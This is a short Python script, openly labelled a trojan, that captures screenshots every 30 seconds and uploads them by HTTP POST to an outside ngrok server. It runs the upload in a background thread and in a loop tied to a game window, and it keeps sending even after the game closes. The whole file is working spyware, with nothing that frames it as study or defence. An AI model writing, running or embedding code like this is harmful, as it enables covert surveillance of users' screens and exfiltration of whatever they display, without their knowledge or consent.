import pyautogui
import requests
import time
from PIL import Image
import io
import threading
import pygetwindow as gw  # For window management

# Function to take a screenshot and send it to the server
def send_screenshot(server_url):
    try:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        img_str = buffer.getvalue()
        response = requests.post(server_url, files={'file': ('screenshot.png', img_str, 'image/png')})
        print(f"Screenshot sent. Status code: {response.status_code}")  # Debug print
        return response.status_code
    except Exception as e:
        print(f"Error sending screenshot: {e}")
        return None

# Function to start the trojan
def start_trojan(server_url):
    while True:
        time.sleep(30)  # Wait for 30 seconds
        send_screenshot(server_url)

# Function to monitor the game window and send a screenshot at regular intervals
def monitor_game_window(server_url, window_title):
    while True:
        try:
            windows = gw.getWindowsWithTitle(window_title)
            if not windows:
                print("Game window closed. Continuing to send screenshots...")
            send_screenshot(server_url)
        except Exception as e:
            print(f"Error checking window or sending screenshot: {e}")
        time.sleep(30)  # Check and send screenshot every 30 seconds

if __name__ == "__main__":
    server_url = server_url = 'https://roxy-maladapted-aeroscopically.ngrok-free.dev'  # Replace with your server URL
    game_window_title = "Your Game Window Title"  # Replace with the actual window title of your game

    # Start the trojan in a separate thread
    trojan_thread = threading.Thread(target=start_trojan, args=(server_url,))
    trojan_thread.start()

    # Monitor the game window
    monitor_game_window(server_url, game_window_title)